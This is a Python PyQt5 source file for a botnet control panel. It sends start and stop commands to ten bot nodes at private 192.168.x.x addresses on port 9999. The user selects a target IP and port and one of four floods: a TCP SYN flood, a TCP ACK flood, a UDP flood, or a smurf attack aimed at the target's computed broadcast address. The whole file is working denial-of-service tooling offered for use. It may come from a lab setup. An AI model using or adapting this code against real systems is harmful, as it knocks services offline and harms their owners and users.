from PyQt5 import QtWidgets, QtGui, QtCore
from ui import Ui_MainWindow
import requests
import ipaddress


class MainWindow(QtWidgets.QMainWindow):
    def __init__(self):
        super().__init__() # in python3, super(Class, self).xxx = super().xxx
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self.ui.comboBox.addItems(['1','2','3','4','5','6','7','8','9','10'])
        
        self.setup_control()
        
    def setup_control(self):
        self.ui.changelabel.setText('123')
        self.ui.pushButton.clicked.connect(self.buttonClicked)
        self.ui.pushButton_2.clicked.connect(self.button_2Clicked)
    
    def buttonClicked(self):
    	
    	host = self.ui.comboBox.currentText()
    	match host:
        	case '1':url = 'http://192.168.200.51:9999/'# Botnet URL
        	case '2':url = 'http://192.168.126.132:9999/'
        	case '3':url = 'http://192.168.200.53:9999/'
        	case '4':url = 'http://192.168.200.54:9999/'
        	case '5':url = 'http://192.168.200.55:9999/'
        	case '6':url = 'http://192.168.200.56:9999/'
        	case '7':url = 'http://192.168.200.57:9999/'
        	case '8':url = 'http://192.168.200.58:9999/'
        	case '9':url = 'http://192.168.200.59:9999/'
        	case '10':url = 'http://192.168.200.60:9999/'
        	
    	IP = self.ui.lineEdit.text()	# IP that you want to attack
    	port = self.ui.lineEdit_2.text()	# Port that you want to attack
    	BdstIP = ipaddress.ip_network( IP + "/24" , strict=False).broadcast_address
    	
    	#Attack type that you use
    	if self.ui.radioButton.isChecked():
    		mode = 'S'
    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
    		da = f"attack:tcp_attack,IP:{IP},port:{port},mode:{mode}"
    	if self.ui.radioButton_2.isChecked():
    		my_data = {'attack':'udp_attack', 'IP':IP, 'port':port}
    		da = f"attack:ucp_attack,IP:{IP},port:{port}"
    	if self.ui.radioButton_3.isChecked():
    		mode = 'A'
    		my_data = {'attack':'tcp_attack', 'IP':IP, 'port':port,'mode':mode}
    		da = f"attack:tcp_attack,IP:{IP},port:{port},mode:{mode}"
    	if self.ui.radioButton_4.isChecked():
    		my_data = {'attack':'smurf.attack', 'IP':IP, 'port':port,'BdstIP':BdstIP}
    		da = f"attack:smurf.attack,IP:{IP},port:{port},BdstIP:{BdstIP}"
    		attack = "smurf_attack"
    		
    	
    	start_url = url + 'start'
    	r = requests.post(start_url, data=my_data)
    	
    	self.ui.changelabel.setText(f"{url} \n{da}")
    def button_2Clicked(self):
    	host = self.ui.comboBox.currentText()
    	match host:
        	case '1':url = 'http://192.168.200.51:9999/'# Botnet URL
        	case '2':url = 'http://192.168.126.132:9999/'
        	case '3':url = 'http://192.168.200.53:9999/'
        	case '4':url = 'http://192.168.200.54:9999/'
        	case '5':url = 'http://192.168.200.55:9999/'
        	case '6':url = 'http://192.168.200.56:9999/'
        	case '7':url = 'http://192.168.200.57:9999/'
        	case '8':url = 'http://192.168.200.58:9999/'
        	case '9':url = 'http://192.168.200.59:9999/'
        	case '10':url = 'http://192.168.200.60:9999/'
        	
    	IP = self.ui.lineEdit.text()	# IP that you want to attack
    	port = self.ui.lineEdit_2.text()	# Port that you want to attack
    	stop_url = url + 'stop'
    	r = requests.get(stop_url)
        
if __name__ == '__main__' :
    import sys
    app = QtWidgets.QApplication(sys.argv)
    window =MainWindow()
    window.show()
    sys.exit(app.exec_())
